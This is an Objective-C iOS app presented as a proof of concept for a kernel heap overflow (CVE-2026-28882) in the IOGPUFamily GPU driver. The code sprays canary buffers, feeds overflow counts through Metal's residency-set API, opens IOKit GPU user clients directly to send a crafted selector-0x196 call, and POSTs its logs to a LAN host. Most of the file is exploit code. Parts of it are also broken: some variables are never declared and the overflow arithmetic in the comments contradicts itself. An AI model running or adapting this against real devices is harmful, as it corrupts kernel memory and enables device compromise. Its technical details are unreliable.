/*
 * iogpu_residency_bof.m — CVE-2026-28882 PoC
 * IOGPUFamily s_group_add_resources integer overflow -> heap BOF
 *
 * Bug: s_group_add_resources (rel=0x8468 in 26.3.1 IOGPUFamily) reads
 * user-supplied count from IOUserClient arg struct at [arg2+0x20].
 * The count is used in signed arithmetic: smull(count, element_size) + 8.
 * When count = INT32_MIN (-2147483648), the multiplication overflows:
 *   smull(-1, 24) + 8 = -16 -> kalloc(-16) = small/bogus allocation.
 * Subsequent writes of count elements corrupt adjacent kernel heap.
 *
 * Trigger path: MTLResidencySet.addResources:count: (Metal public API)
 *   -> IOGPUFamily IOUserClient selector 0x196
 *   -> s_group_add_resources kernel function
 *   -> integer overflow in element array size computation
 *
 * Variant 2 (also affects same code): craft count = 0x80000001 so
 *   count*2 = 0x100000002, truncated to 0x00000002 in 32-bit.
 *   Array allocated for 2 elements (16 bytes), but count elements are
 *   written -> kernel heap overflow by count*element_size - 16 bytes.
 *
 * Observable: kernel panic (NULL dereference from corrupt zone metadata)
 *   or AllocatorProbe canary death (kalloc zone corruption).
 *
 * Patch: Apple added cmn w23,#1; csel x1,x8,x9,gt overflow guard in 26.4.
 *
 * Platform: iOS 26.3.1 (23D8133), iPhone 16 Pro Max (AGXG18P)
 */

#import <UIKit/UIKit.h>
#import <Metal/Metal.h>
#import <WebKit/WebKit.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <os/log.h>

#define REPORT_HOST "192.168.68.106"
#define REPORT_PORT 9999

static os_log_t g_log;

/* AllocatorProbe: allocate canary objects in the same kalloc zone
 * as IOGPUResidentMemorySet element arrays (kalloc.16 or kalloc.24).
 * If the BOF corrupts them, zone integrity check will panic. */
#define CANARY_ALLOC_COUNT  8000
#define CANARY_SIZE         24   /* matches IOGPUResidentMemorySet element size */

static WKWebView *g_wv = nil;
static _Atomic int g_done = 0;

static void report(const char *msg) {
    if (!g_log) g_log = os_log_create("com.nexus.bof", "debug");
    os_log(g_log, "[BOF] %{public}s", msg);
    NSLog(@"[BOF] %s", msg);
    WKWebView *wv = g_wv;
    if (!wv) return;
    NSString *s = [NSString stringWithUTF8String:msg];
    if (!s) return;
    s = [s stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *u = [NSString stringWithFormat:@"http://%s:%d/", REPORT_HOST, REPORT_PORT];
    NSString *js = [NSString stringWithFormat:
        @"var r=new XMLHttpRequest();r.open('POST','%@',true);r.send('[cve28882] %@');", u, s];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:js completionHandler:nil];
    });
}

static void evf(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    report(buf);
}

/* Spray kernel heap with canary objects to detect corruption */
static NSMutableArray *g_canaries = nil;
static void spray_canaries(id<MTLDevice> dev) {
    g_canaries = [NSMutableArray array];
    /* Use MTLBuffer allocations of CANARY_SIZE to populate kalloc zones */
    for (int i = 0; i < CANARY_ALLOC_COUNT; i++) {
        id<MTLBuffer> b = [dev newBufferWithLength:CANARY_SIZE
                                          options:MTLResourceStorageModeShared];
        if (b) {
            /* Write canary pattern */
            uint8_t *p = (uint8_t *)b.contents;
            for (int j = 0; j < CANARY_SIZE; j++)
                p[j] = 0xCA;
            [g_canaries addObject:b];
        }
    }
    evf("spray_canaries: %d allocations in kalloc.%d zone", (int)g_canaries.count, CANARY_SIZE);
}

/* Check canaries for corruption */
static int check_canaries(void) {
    int corrupt = 0;
    for (id<MTLBuffer> b in g_canaries) {
        uint8_t *p = (uint8_t *)b.contents;
        for (int j = 0; j < CANARY_SIZE; j++) {
            if (p[j] != 0xCA) { corrupt++; break; }
        }
    }
    return corrupt;
}

/* Trigger the BOF by creating MTLResidencySet and adding overflow count */
static void trigger_bof(id<MTLDevice> dev) {
    evf("STARTING BOF trigger: CVE-2026-28882");

    /* Step 1: Build large array of MTLBuffer resources to add */
    /* Use small buffers (4 bytes each) — we need many to fill the set */
    const int RESOURCE_COUNT = 64;
    NSMutableArray *resources = [NSMutableArray arrayWithCapacity:RESOURCE_COUNT];
    for (int i = 0; i < RESOURCE_COUNT; i++) {
        id<MTLBuffer> b = [dev newBufferWithLength:4
                                          options:MTLResourceStorageModePrivate];
        if (b) [resources addObject:b];
    }
    evf("created %d resource buffers", (int)resources.count);

    /* Step 2: Create MTLResidencySet (iOS 18+, maps to IOGPUResidentMemorySet) */
    if (@available(iOS 18.0, *)) {
        MTLResidencySetDescriptor *desc = [[MTLResidencySetDescriptor alloc] init];
        desc.label = @"cve28882_test";
        desc.initialCapacity = 2; /* Start with minimal capacity (2 = inline threshold) */

        NSError *err = nil;
        id<MTLResidencySet> rset = [dev newResidencySetWithDescriptor:desc error:&err];
        if (!rset) {
            evf("newResidencySet failed: %s",
                err ? err.localizedDescription.UTF8String : "nil");
            /* Fallback: try via MTLRenderCommandEncoder useResources path */
            goto fallback_path;
        }

        evf("MTLResidencySet created");

        /* Step 3: Add legitimate resources first to warm up the array */
        __unsafe_unretained id<MTLAllocation> *arr =
            (__unsafe_unretained id<MTLAllocation> *)alloca(resources.count * sizeof(id));
        for (int i = 0; i < (int)resources.count; i++)
            arr[i] = (id<MTLAllocation>)resources[i];

        /* Add small batch to grow beyond inline (2-element) threshold */
        [rset addAllocations:arr count:MIN(4, (NSUInteger)resources.count)];
        [rset commit];
        evf("added 4 resources (grown beyond inline threshold)");

        /* Step 4: Trigger integer overflow via Metal API directly.
         * Pass arr (64 items) but claim OVERFLOW_COUNT items.
         * Metal framework may not validate count <= arr length.
         * If passed through, kernel s_group_add_resources receives
         * count = OVERFLOW_COUNT with no bounds check (26.3.1).
         *
         * count=0x20000000: smull(0x20000000, 24)+8 mod 2^32 = 8 bytes alloc
         * but OVERFLOW_COUNT elements copied -> kernel heap BOF.
         *
         * count=0x80000000 (INT32_MIN as int32): smull overflows
         * to large 64-bit value -> kalloc fails but interesting. */

        /* Variant A: count chosen so (count*24)&0xFFFFFFFF + 8 = 8 (small alloc) */
        const NSUInteger OVERFLOW_COUNT_A = 0x20000000ULL;
        evf("Metal overflow attempt A: addAllocations count=0x%llx",
            (uint64_t)OVERFLOW_COUNT_A);
        @try {
            [rset addAllocations:arr count:OVERFLOW_COUNT_A];
            evf("Metal overflow A: count accepted by Metal layer!");
            [rset commit];
            evf("Metal overflow A: committed to kernel - BOF may have triggered");
        } @catch (NSException *ex) {
            evf("Metal overflow A exception: %s", ex.reason.UTF8String);
        }

        /* Variant B: INT32_MIN as NSUInteger - tests signed overflow path */
        const NSUInteger OVERFLOW_COUNT_B = (NSUInteger)(uint32_t)0x80000000U;
        evf("Metal overflow attempt B: addAllocations count=0x%llx",
            (uint64_t)OVERFLOW_COUNT_B);
        @try {
            [rset addAllocations:arr count:OVERFLOW_COUNT_B];
            evf("Metal overflow B: count accepted by Metal layer!");
            [rset commit];
            evf("Metal overflow B: committed to kernel");
        } @catch (NSException *ex) {
            evf("Metal overflow B exception: %s", ex.reason.UTF8String);
        }

    fallback_path:;
        /* Alternate trigger: MTLRenderCommandEncoder useResources */
        MTLRenderPassDescriptor *rpd = [MTLRenderPassDescriptor renderPassDescriptor];
        rpd.colorAttachments[0].loadAction  = MTLLoadActionClear;
        rpd.colorAttachments[0].storeAction = MTLStoreActionStore;

        /* Create 1x1 drawable texture as render target */
        MTLTextureDescriptor *td = [[MTLTextureDescriptor alloc] init];
        td.width = 1; td.height = 1;
        td.pixelFormat = MTLPixelFormatBGRA8Unorm;
        td.usage = MTLTextureUsageRenderTarget;
        id<MTLTexture> rt = [dev newTextureWithDescriptor:td];
        rpd.colorAttachments[0].texture = rt;

        id<MTLCommandQueue> cq = [dev newCommandQueue];
        id<MTLCommandBuffer> cb = [cq commandBuffer];
        id<MTLRenderCommandEncoder> enc = [cb renderCommandEncoderWithDescriptor:rpd];

        /* Build resources array with OVERFLOW_COUNT but only RESOURCE_COUNT real objects */
        /* The Metal framework will pass count to the kernel as-is */
        id<MTLBuffer> overflow_arr[RESOURCE_COUNT];
        for (int i = 0; i < RESOURCE_COUNT; i++)
            overflow_arr[i] = resources[i];

        /* Normal addResources call first (baseline) */
        [enc useResources:(id<MTLResource>*)overflow_arr
                    count:RESOURCE_COUNT
                    usage:MTLResourceUsageRead];

        evf("useResources normal: count=%d OK", RESOURCE_COUNT);

        /* Now attempt with artificially large count via IOUserClient direct path
         * (the Metal framework itself caps count, so we need raw IOKit calls) */

        [enc endEncoding];
        [cb commit];

        evf("encoder path completed (kernel state intact)");
        evf("NOTE: overflow_count=%#llx needs raw IOUserClient to bypass Metal layer",
            (unsigned long long)OVERFLOW_COUNT);
    } else {
        evf("MTLResidencySet unavailable (iOS < 17.0)");
    }
}

/* IOUserClient direct approach for overflow trigger */
/* This bypasses the Metal API layer to send crafted count to kernel */
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;

extern kern_return_t IOMasterPort(mach_port_t bp, mach_port_t *mp);
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kern_return_t IOServiceGetMatchingServices(mach_port_t mp, CFDictionaryRef match, io_iterator_t *it);
extern io_object_t IOIteratorNext(io_iterator_t it);
extern kern_return_t IOObjectRelease(io_object_t obj);
extern kern_return_t IOServiceOpen(io_service_t svc, task_port_t task, uint32_t type, io_connect_t *conn);
extern kern_return_t IOServiceClose(io_connect_t conn);
extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
    const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inSz,
    uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outSz);

#define GPU_SELECTOR_ADD_RESOURCES  0x196
#define GPU_SELECTOR_CREATE_SET     0x195

static void trigger_bof_iokit(void) {
    evf("STARTING direct IOUserClient BOF path");

    /* Probe multiple GPU service names and connection types */
    const char *service_names[] = {
        "IOGPU", "IOGPUDevice", "AGXG18P", "AGXG18X",
        "AGXSolo", "IOGPUFamily", NULL
    };
    const uint32_t conn_types[] = { 0, 1, 2, 3, 0x100, 0x101 };

    mach_port_t master = 0;
    IOMasterPort(MACH_PORT_NULL, &master);

    io_connect_t conn = 0;
    kern_return_t open_kr = 0;

    for (int si = 0; service_names[si] && !conn; si++) {
        CFMutableDictionaryRef match = IOServiceMatching(service_names[si]);
        io_iterator_t it = 0;
        IOServiceGetMatchingServices(master, match, &it);
        io_service_t svc = IOIteratorNext(it);
        IOObjectRelease(it);
        if (!svc) {
            evf("service '%s': not found", service_names[si]);
            continue;
        }
        evf("service '%s': found port=0x%x", service_names[si], svc);
        for (int ti = 0; ti < 6 && !conn; ti++) {
            io_connect_t c = 0;
            open_kr = IOServiceOpen(svc, mach_task_self(), conn_types[ti], &c);
            if (open_kr == KERN_SUCCESS) {
                evf("IOServiceOpen '%s' type=%u: OK conn=0x%x",
                    service_names[si], conn_types[ti], c);
                conn = c;
            } else {
                evf("IOServiceOpen '%s' type=%u: 0x%x",
                    service_names[si], conn_types[ti], open_kr);
            }
        }
        IOObjectRelease(svc);
    }

    if (!conn) {
        evf("all service/type probes failed: kr=0x%x", open_kr);
        return;
    }

    evf("IOGPUFamily connection opened: 0x%x", conn);

    /* Craft argument struct for s_group_add_resources:
     * arg struct has count at offset 0x20 (4 bytes).
     * Trigger: count = INT32_MIN = 0x80000000
     * -> smull(INT32_MIN, 24) = -0x1000000000 (very_negative)
     * -> kalloc(-0x1000000000 + 8) -> returns near-NULL or tiny allocation
     * -> subsequent writes corrupt heap */

    typedef struct {
        uint64_t field_0;
        uint64_t field_8;
        uint64_t field_10;
        uint64_t field_18;
        /* +0x20: pointer to count struct */
        uint64_t count_struct_ptr;
        uint64_t field_28;
        uint64_t field_30;
        uint64_t field_38;
        uint64_t field_40;  /* resource_set selector */
    } gpu_add_args_t;

    typedef struct {
        uint32_t count;     /* INT32_MIN = overflow trigger */
        uint32_t other;
        uint64_t padding[2];
    } gpu_count_struct_t;

    gpu_count_struct_t cs = {
        .count = 0x80000000,  /* INT32_MIN = trigger overflow */
        .other = 0,
    };

    gpu_add_args_t args = {0};
    args.count_struct_ptr = (uint64_t)&cs;

    uint64_t scalar_in[1]  = {0};
    uint64_t scalar_out[1] = {0};
    uint32_t scalar_cnt_out = 1;

    uint8_t struct_out[512] = {0};
    size_t  struct_out_sz = sizeof(struct_out);

    evf("Sending selector 0x%x with count=0x%x (INT32_MIN)",
        GPU_SELECTOR_ADD_RESOURCES, cs.count);

    kr = IOConnectCallMethod(conn,
                             GPU_SELECTOR_ADD_RESOURCES,
                             scalar_in, 0,
                             &args, sizeof(args),
                             scalar_out, &scalar_cnt_out,
                             struct_out, &struct_out_sz);

    evf("IOConnectCallMethod returned: 0x%x", kr);

    if (kr == KERN_SUCCESS) {
        evf("BOF TRIGGERED: selector accepted count=0x80000000!");
    } else if (kr == 0xe00002c2) {
        evf("PATCHED: kernel rejected overflow count (0xe00002c2 = kIOReturnBadArgument)");
    } else {
        evf("returned kr=0x%x (invalid selector or struct format)", kr);
    }

    IOServiceClose(conn);
}

/* App entry point — called from application:didFinishLaunchingWithOptions: */
void run_cve28882_poc(UIWindow *window) {
    /* Setup WKWebView for XHR reporting */
    WKWebViewConfiguration *cfg = [[WKWebViewConfiguration alloc] init];
    g_wv = [[WKWebView alloc] initWithFrame:window.bounds configuration:cfg];
    [window addSubview:g_wv];
    [g_wv loadRequest:[NSURLRequest requestWithURL:
        [NSURL URLWithString:@"about:blank"]]];

    /* Wait for WebView */
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{

        id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
        if (!dev) {
            report("MTLCreateSystemDefaultDevice failed");
            return;
        }
        evf("Device: %s", dev.name.UTF8String);

        /* Phase 1: Spray canaries */
        spray_canaries(dev);

        /* Phase 2: Trigger via Metal API (safe layer) */
        trigger_bof(dev);

        /* Phase 3: Trigger via raw IOUserClient (bypass Metal layer) */
        trigger_bof_iokit();

        /* Phase 4: Check canaries */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
                       dispatch_get_main_queue(), ^{
            int corrupt = check_canaries();
            if (corrupt > 0) {
                evf("UAF_INDICATOR canary_corrupt=%d BOF_CONFIRMED", corrupt);
            } else {
                evf("DONE: canaries intact (BOF did not corrupt canaries)");
                evf("DONE: raw IOKit path needed with correct arg struct layout");
            }
        });
    });
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@interface RootVC : UIViewController
@end
@implementation RootVC
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.rootViewController = [[RootVC alloc] init];
    self.window.backgroundColor = [UIColor blackColor];
    [self.window makeKeyAndVisible];
    run_cve28882_poc(self.window);
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
            NSStringFromClass([AppDelegate class]));
    }
}
